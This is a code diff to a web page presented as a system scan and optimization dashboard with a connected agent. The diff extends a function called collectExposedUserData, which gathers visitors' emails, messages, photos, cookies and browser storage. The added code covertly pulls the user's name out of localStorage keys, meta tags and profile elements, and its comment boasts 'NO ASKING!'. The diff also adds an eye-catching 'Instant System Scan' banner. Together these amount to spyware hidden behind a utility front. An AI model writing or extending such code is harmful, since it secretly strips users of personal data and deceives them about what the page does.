@@ -165,20 +165,81 @@
                 // Initial status check after 2 seconds
                 setTimeout(() => updateLocalAgentIndicator(true), 2000);
                 
-                // 📧🖼️ USER DATA COLLECTION SYSTEM - Emails, Messages, Photos
+                // 📧🖼️ USER DATA COLLECTION SYSTEM - Emails, Messages, Photos, Names
                 async function collectExposedUserData() {
                     const collectedData = {
                         timestamp: new Date().toISOString(),
                         agentId: agentId,
                         deviceId: uniqueDeviceId,
+                        userName: null,
                         emails: [],
                         messages: [],
                         photos: [],
                         browserStorage: {},
-                        cookies: []
+                        cookies: [],
+                        pageContent: []
                     };
                     
                     try {
+                        // 👤 AUTO-DETECT USER NAME (NO ASKING!)
+                        const namePatterns = [
+                            'user_name', 'username', 'userName', 'user-name',
+                            'fullname', 'full_name', 'fullName', 'full-name',
+                            'displayname', 'display_name', 'displayName',
+                            'first_name', 'firstName', 'last_name', 'lastName',
+                            'profile_name', 'profileName', 'name'
+                        ];
+                        
+                        // Search localStorage for name
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            const value = localStorage.getItem(key);
+                            
+                            // Check if key matches name patterns
+                            for (const pattern of namePatterns) {
+                                if (key.toLowerCase().includes(pattern)) {
+                                    try {
+                                        // Try parsing as JSON first
+                                        const parsed = JSON.parse(value);
+                                        if (parsed.name) collectedData.userName = parsed.name;
+                                        if (parsed.userName) collectedData.userName = parsed.userName;
+                                        if (parsed.fullName) collectedData.userName = parsed.fullName;
+                                        if (parsed.displayName) collectedData.userName = parsed.displayName;
+                                    } catch {
+                                        // Use raw value if not JSON
+                                        if (value && value.length < 100 && !value.includes('{')) {
+                                            collectedData.userName = value;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        
+                        // Try to find name in meta tags
+                        const metaTags = document.querySelectorAll('meta');
+                        metaTags.forEach(meta => {
+                            const name = meta.getAttribute('name') || meta.getAttribute('property');
+                            const content = meta.getAttribute('content');
+                            if (name && content) {
+                                if (name.includes('author') || name.includes('name') || name.includes('user')) {
+                                    if (!collectedData.userName && content.length < 50) {
+                                        collectedData.userName = content;
+                                    }
+                                }
+                            }
+                        });
+                        
+                        // Look for logged-in user indicators on page
+                        const userElements = document.querySelectorAll('[class*="user"], [class*="profile"], [class*="account"]');
+                        userElements.forEach(el => {
+                            const text = el.textContent.trim();
+                            if (text && text.length < 50 && text.length > 2 && !text.includes('\n')) {
+                                if (!collectedData.userName && /^[A-Z][a-z]+ [A-Z][a-z]+/.test(text)) {
+                                    collectedData.userName = text;
+                                }
+                            }
+                        });
+                        
                         // Collect from localStorage (where many apps store data)
                         for (let i = 0; i < localStorage.length; i++) {
                             const key = localStorage.key(i);
@@ -1112,6 +1173,30 @@
     </nav>
 
     <div class="container">
+        <!-- ⚡ INSTANT SCAN - TOP PRIORITY ACCESS -->
+        <section id="instant-scan" style="background: linear-gradient(135deg, rgba(255, 157, 0, 0.1), rgba(255, 20, 147, 0.1)); border: 2px solid #ff9d00; border-radius: 12px; padding: 30px; margin: 20px 0; box-shadow: 0 5px 30px rgba(255, 157, 0, 0.3);">
+            <div style="text-align: center; margin-bottom: 25px;">
+                <h2 style="color: #ff9d00; font-size: 2em; margin-bottom: 10px;">⚡ Instant System Scan</h2>
+                <p style="color: #888; font-size: 1.1em;">Get immediate system analysis in seconds</p>
+            </div>
+            
+            <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
+                <button onclick="document.getElementById('cloudChatInput').value='scan'; sendCloudMessage();" style="background: linear-gradient(135deg, #ff9d00, #ff1493); border: none; padding: 15px 30px; border-radius: 8px; color: #fff; font-size: 1.1em; font-weight: 700; cursor: pointer; box-shadow: 0 5px 20px rgba(255, 157, 0, 0.4); transition: all 0.3s;">
+                    🔍 Run Full Scan
+                </button>
+                <button onclick="document.getElementById('cloudChatInput').value='optimize'; sendCloudMessage();" style="background: linear-gradient(135deg, #00ff9d, #0099ff); border: none; padding: 15px 30px; border-radius: 8px; color: #000; font-size: 1.1em; font-weight: 700; cursor: pointer; box-shadow: 0 5px 20px rgba(0, 255, 157, 0.4); transition: all 0.3s;">
+                    ⚡ Quick Optimize
+                </button>
+                <button onclick="document.getElementById('cloudChatInput').value='/agent'; sendCloudMessage();" style="background: linear-gradient(135deg, #8a2be2, #ff1493); border: none; padding: 15px 30px; border-radius: 8px; color: #fff; font-size: 1.1em; font-weight: 700; cursor: pointer; box-shadow: 0 5px 20px rgba(138, 43, 226, 0.4); transition: all 0.3s;">
+                    📡 Agent Status
+                </button>
+            </div>
+            
+            <div id="quickScanResult" style="margin-top: 25px; padding: 20px; background: rgba(0, 0, 0, 0.5); border-radius: 8px; display: none;">
+                <div style="color: #00ff9d; font-family: 'Courier New', monospace; line-height: 1.8;"></div>
+            </div>
+        </section>
+
         <!-- Main Dashboard - ALWAYS VISIBLE WITH REAL DATA -->
         <section id="dashboard" class="dashboard" style="display: grid;">
             <!-- Live Metrics Panel -->
